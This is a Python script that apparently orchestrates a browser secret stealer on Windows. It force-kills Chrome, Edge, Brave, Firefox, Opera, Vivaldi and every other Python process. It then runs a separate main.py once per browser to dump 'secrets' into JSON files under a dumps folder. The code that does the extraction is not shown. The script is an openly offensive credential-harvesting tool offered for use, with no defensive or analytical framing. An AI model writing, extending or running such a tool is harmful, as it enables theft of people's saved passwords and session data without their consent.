import subprocess
import time
import os
import sys

def kill_processes():
    print("[*] Cleaning up background processes...")
    
    # List of processes to kill
    
    targets = [
        "chrome.exe", "msedge.exe", "brave.exe", 
        "firefox.exe", "opera.exe", "vivaldi.exe"
    ]
    
    # Kill browser processes
    for target in targets:
        subprocess.run(f"taskkill /F /IM {target}", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

    # Kill other python processes, but EXCLUDE the current one (so the script doesn't kill itself)
    current_pid = os.getpid()
    subprocess.run(f'taskkill /F /IM python.exe /FI "PID ne {current_pid}"', shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    
    time.sleep(2)
    print()

def run_extractor(browser, output_file):
    print(f"[*] Extracting {browser.capitalize()} Secrets...")
    # Uses the current python interpreter to run main.py
    try:
        subprocess.run([sys.executable, "main.py", f"/b:{browser}", f"/f:{output_file}"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Error running extraction for {browser}: {e}")
    print()

if __name__ == "__main__":
    kill_processes()
    
    # List of extractions to run
    # add more browsers if needed, these are just common browsers 
    tasks = [
        ("chrome", "dumps/secrets_chrome.json"),
        ("edge", "dumps/secrets_edge.json"),
        ("firefox", "dumps/secrets_firefox.json"),
        ("brave", "dumps/secrets_brave.json")
        # ("opera", "dumps/secrets_opera.json"), 
        # ("vivaldi", "dumps/secrets_vivaldi.json")
    ]
    
    for browser_name, output_file in tasks:
        run_extractor(browser_name, output_file)
        
    print("[+] All Done. Check the json files.")
    input("Press Enter to exit...")